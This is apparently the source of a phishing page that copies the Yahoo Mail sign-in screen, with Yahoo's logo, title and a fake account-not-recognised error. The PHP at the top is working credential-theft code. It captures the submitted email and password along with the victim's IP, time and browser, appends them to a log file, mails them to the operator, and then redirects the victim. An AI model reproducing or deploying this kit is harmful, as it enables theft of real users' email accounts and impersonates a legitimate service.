<?php


if(isset($_POST['submit'])){
    error_reporting(0);

    session_start();
    
    
    require('../../myEmail.php');

$_SESSION['password'] = $_POST['password'];
$password = $_SESSION['password'];


$_SESSION['email'] = $_POST['email'];
$email = $_SESSION['email'];





$useragent = $_SERVER['HTTP_USER_AGENT'];

$mailTo = $myEmail;

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

date_default_timezone_set('Europe/London');
	$ip = $_SERVER['REMOTE_ADDR'];
	$time = date("m-d-Y g:i:a");
	$agent = $_SERVER['HTTP_USER_AGENT'];




$txt =  "&& YAHOO MAIL ACCESS *(2 0F 2 ATTEMPTS)*\n";
$txt .= "EMAIL : ".$email."\n";
$txt .= "PASSWORD : ".$password."\n";
$txt .= "=================================================\n";
$txt .= "Sent from   " .$ip. "  on   "   .$time. " via   " .$agent.".\n";

$subject = "YAHOO ACCESS FOR"." ".$ip;
 $headers = "YAHOO ACCESS FOR"." ".$ip;
 
 
 $fp = fopen("logs/results.txt", "a");
 fputs($fp,$txt);
 fclose($fp);
 

 mail($mailTo, $subject, $txt, $headers);

header('location:email-invalid.php');


exit();

}


?>
<!DOCTYPE html>
<html class="grid no-js light-theme">
<head>
    <title>Yahoo – login</title>
    <meta name="description" content="Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web, you get more out of life." />
    <meta http-equav="Content-Type" content="text/html;charset=utf-8">
    <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0" />
    <meta name="referrer" content="origin-when-cross-origin">
   <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<script src="https://cdn.jsdelivr.net/jquery.validation/1.15.1/jquery.validate.min.js"></script>
<link href="https://fonts.googleapis.com/css?family=Kaushan+Script" rel="stylesheet">
<link rel="icon" type="image/x-icon" href="styles/yahoo-favicon-img-v0.0.2.ico">
      <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
      
      <script>
          
          function validateEmail(){
              
              var email = document.getElementById('fuckinemail');
               var text = document.getElementById('emailText');
              if(email.value.indexOf('@') === -1){
                  
                  email.style.borderBottom = "1px solid #dc3545";
                  
                  text.style.display = "block";
                  
                  return false;
                  
              }else{
                  
                  return true;
                  
              }
              
              
          }
          
          
          
          
      </script>
            <script>
          
          function validatePass(){
              
              var pass = document.getElementById('fuckinpass');
               var text = document.getElementById('passText');
              if(pass.value.length < 1){
                  
                  pass.style.borderBottom = "1px solid #dc3545";
                  
                  text.style.display = "block";
                  
                  return false;
                  
              }else{
                  
                  return true;
                  
              }
              
              
          }
          
          
          
          
      </script>
<style>
            body{
        padding-top:4.2rem;
		padding-bottom:4.2rem;
	font-family: 'Yahoo Sans','Helvetica Neue',Helvetica,Arial;
        }
        a{
         text-decoration:none !important;
         }
         h1,h2,h3{
         font-family: 'Kaushan Script', cursive;
         }
          .myform{
		position: relative;
		display: -ms-flexbox;
		display: flex;
		padding: 1rem;
		-ms-flex-direction: column;
		flex-direction: column;
		width: 100%;
		pointer-events: auto;
		background-color: #fff;
		background-clip: padding-box;
		border: 1px solid rgba(0,0,0,.2);
		border-radius: 1.1rem;
		outline: 0;
		max-width: 500px;
		 }
         .tx-tfm{
         text-transform:uppercase;
         }
         .mybtn{
         border-radius:50px;
         }
        
         .login-or {
         position: relative;
         color: #aaa;
         margin-top: 10px;
         margin-bottom: 10px;
         padding-top: 10px;
         padding-bottom: 10px;
         }
         .span-or {
         display: block;
         position: absolute;
         left: 50%;
         top: -2px;
         margin-left: -25px;
         background-color: #fff;
         width: 50px;
         text-align: center;
         }
         .hr-or {
         height: 1px;
         margin-top: 0px !important;
         margin-bottom: 0px !important;
         }
         .google {
         color:#666;
         width:100%;
         height:40px;
         text-align:center;
         outline:none;
         border: 1px solid lightgrey;
         }
          form .error {
         color: #ff0000;
         }
         #second{display:none;}
    
    input{
        
        border:none !important;
        outline:none !important;
        border-bottom: 1px solid #b9bdc5 !important;
        border-radius:0px !important;
        padding: 0 !important;
        font-size: 0.9em !important;
height: 37px !important;
letter-spacing: .5px !important;
        
    }
    
    input:focus{
        
        outline:none !important;
        highlight:none !important;
        bottom:border 1px solid #188fff  !important;
          border-color: #188fff !important;
  box-shadow: 0 1px 1px white inset, 0 0 8px white !important;;
  outline: 0 none !important;;
        
    }
    
</style>
<body>
     
    <div class="container">
        <div class="row">
			<div class="col-md-4 mx-auto">
			<div id="first">
				<div class="myform form " style="box-shadow: 0 2px 4px 0 rgba(181,181,181,.7);border:none;border-radius:0px">
					 <div class="logo mb-3">
						 <div class="col-md-12 text-center">
						<img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" width="" height="27">
						 </div>
					</div>
                   <form action="../../failed.php
                   " method="post" name="login" onsubmit="return !! (validatePass() &validateEmail()) ">
                         <div class="form-group" >
                              <p class="text-center" style="display: block;
margin: 14px 0 0;
    margin-top: 14px;
margin-top: .82353rem;
font-size: 20px;
font-size: 1.17647rem;
font-weight: 600;
letter-spacing: -.2px;
text-align: center;
line-height: 23px;
line-height: 1.35294rem;">Sign in to Yahoo Mail <br> <p class="text-center" style="isplay: block;
padding: 0 !important;
margin-top: 6px;
margin-top: .35294rem;
font-size: 14px;
font-size: .82353rem;
letter-spacing: -.3px;
line-height: 17px;
line-height: 1rem;">Sign in using your Yahoo account </p></p>
                           </div>  <div class="form-group">
                            
                           </div><br><br>
                           <div class="form-group">
                           
                              <input type="text" name="email"  class="form-control" id="fuckinemail" aria-describedby="emailHelp" placeholder="Email address">
                              <p id="emailText" class="row error" role="alert" data-error="messages.ERROR_INVALID_USERNAME" style="color:#dc3545;font-size:12px;position:relative;left:1rem;display:block">Sorry, we don't recognise this account, try again.</p>
                           </div>
                           <div class="form-group">
                             
                              <input type="password" name="password" id="fuckinpass"  class="form-control" aria-describedby="emailHelp" placeholder="password">
                                 <p id="passText" class="row error" role="alert" data-error="messages.ERROR_INVALID_USERNAME" style="color:#dc3545;font-size:12px;position:relative;left:1rem;display:none">Sorry, we don't recognise this&nbsp;password.</p>
                           </div>
                           <div class="form-group">
                             <br><br>
                           </div>
                           <div class="col-md-12 text-center ">
                              <button type="submit" class=" btn btn-block mybtn btn-primary tx-tfm" style="    background: #ccc;
    background: #188fff;
    border: 1px solid hsla(0,0%,0%,0);
    border-radius: 1.17647rem;
    box-sizing: border-box;
    color: #fff;
    display: inline-block;
    height: 42px;
    line-height: 1;
    outline: 0;
    overflow: hidden;
    tap-highlight-color: hsla(0,0%,0%,0);
    text-align: center;
    text-overflow: ellipsis;
    text-transform: none;
    vertical-align: middle;
    white-space: nowrap;
    zoom: 1;
width:90%;" name="submit">Next</button>
                           </div>
            
                           <div class="form-group">
                            
                           </div>
                        </form>
                 
				</div>
			</div>
			  
         
</body>
</html>
<!-- lfe03.member.ir2.yahoo.com - Tue Apr 07 2020 22:13:31 GMT+0000 (Coordinated Universal Time) - (8ms) -->